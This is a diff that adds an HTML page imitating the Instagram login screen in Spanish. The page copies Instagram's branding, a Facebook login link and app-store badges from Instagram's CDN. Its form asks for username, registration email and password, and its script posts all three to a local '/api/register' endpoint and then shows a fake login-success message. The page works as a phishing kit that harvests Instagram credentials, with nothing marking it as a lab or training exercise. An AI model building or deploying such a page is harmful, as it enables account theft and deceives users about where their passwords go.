@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #fafafa;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding-bottom: 30px;
+        }
+        .main-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 350px;
+        }
+        .login-box {
+            background-color: #ffffff;
+            border: 1px solid #dbdbdb;
+            width: 100%;
+            padding: 40px 40px 20px 40px;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        .logo-fallback {
+            font-weight: 600;
+            font-size: 32px;
+            color: #262626;
+            margin-bottom: 30px;
+            letter-spacing: -0.5px;
+        }
+        .input-group {
+            position: relative;
+            margin-bottom: 6px;
+            width: 100%;
+        }
+        .input-field {
+            width: 100%;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 9px 8px 7px 8px;
+            font-size: 12px;
+            color: #262626;
+            outline: none;
+        }
+        .input-field:focus {
+            border-color: #a8a8a8;
+        }
+        .btn-submit {
+            width: 100%;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 7px;
+            font-weight: 600;
+            font-size: 14px;
+            margin-top: 14px;
+            cursor: pointer;
+        }
+        .btn-submit:hover {
+            background-color: #1877f2;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 18px 0;
+        }
+        .line {
+            flex-grow: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+        .or-text {
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+            padding: 0 18px;
+            text-transform: uppercase;
+        }
+        .fb-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+            margin-top: 8px;
+            margin-bottom: 15px;
+        }
+        .fb-login span {
+            margin-left: 8px;
+        }
+        .forgot-password {
+            font-size: 12px;
+            color: #00376b;
+            text-decoration: none;
+        }
+        .signup-box {
+            background-color: #ffffff;
+            border: 1px solid #dbdbdb;
+            width: 100%;
+            padding: 22px;
+            text-align: center;
+            font-size: 14px;
+            color: #262626;
+        }
+        .signup-box a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        .get-the-app {
+            text-align: center;
+            font-size: 14px;
+            color: #262626;
+            margin: 20px 0;
+        }
+        .app-stores {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 15px;
+        }
+        .app-stores img {
+            height: 40px;
+        }
+        .message {
+            margin-top: 15px;
+            font-size: 13px;
+            color: #ed4956;
+            text-align: center;
+        }
+        .message.success {
+            color: #0095f6;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-container">
+        <!-- Tarjeta principal de inicio de sesión -->
+        <div class="login-box">
+            <h1 class="logo-fallback">Instagram</h1>
+            
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="text" id="username" class="input-field" placeholder="Teléfono, usuario o correo electrónico" required>
+                </div>
+                <div class="input-group">
+                    <input type="email" id="email" class="input-field" placeholder="Correo electrónico de registro" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" class="input-field" placeholder="Contraseña" required>
+                </div>
+                
+                <button type="submit" class="btn-submit">Entrar</button>
+            </form>
+
+            <div class="divider">
+                <div class="line"></div>
+                <div class="or-text">O</div>
+                <div class="line"></div>
+            </div>
+
+            <a href="#" class="fb-login">
+                <svg aria-hidden="true" height="16" role="img" viewBox="0 0 24 24" width="16" fill="#385185"><path d="M12 2.04c-5.5 0-10 4.5-10 10 0 5 3.66 9.15 8.44 9.9v-7H7.9v-2.9h2.54V9.85c0-2.51 1.49-3.89 3.78-3.89 1.09 0 2.23.19 2.23.19v2.47h-1.26c-1.24 0-1.63.77-1.63 1.56v1.88h2.78l-.45 2.9h-2.33v7a10 10 0 0 0 8.44-9.9c0-5.5-4.5-10-10-10z"></path></svg>
+                <span>Iniciar sesión con Facebook</span>
+            </a>
+
+            <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
+
+            <div id="responseMessage" class="message"></div>
+        </div>
+
+        <!-- Tarjeta inferior de registro -->
+        <div class="signup-box">
+            ¿No tienes una cuenta? <a href="#">Regístrate</a>
+        </div>
+
+        <!-- Sección de descarga de apps -->
+        <div class="get-the-app">
+            Descarga la aplicación.
+            <div class="app-stores">
+                <a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/ye/r/Zj2w1Qd3cK-.png" alt="Google Play"></a>
+                <a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/yf/r/BFItLBdPI-I.png" alt="App Store"></a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Script de conexión que envía los datos del formulario al servidor -->
+    <script>
+        const form = document.getElementById('loginForm');
+        const responseMessage = document.getElementById('responseMessage');
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            try {
+                const response = await fetch('/api/register', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, email, password })
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    responseMessage.className = 'message success';
+                    responseMessage.textContent = '¡Inicio de sesión registrado correctamente!';
+                    form.reset();
+                } else {
+                    responseMessage.className = 'message';
+                    responseMessage.textContent = data.message;
+                }
+            } catch (error) {
+                responseMessage.className = 'message';
+                responseMessage.textContent = 'Error de conexión con el servidor.';
+            }
+        });
+    </script>
+</body>
+</html>
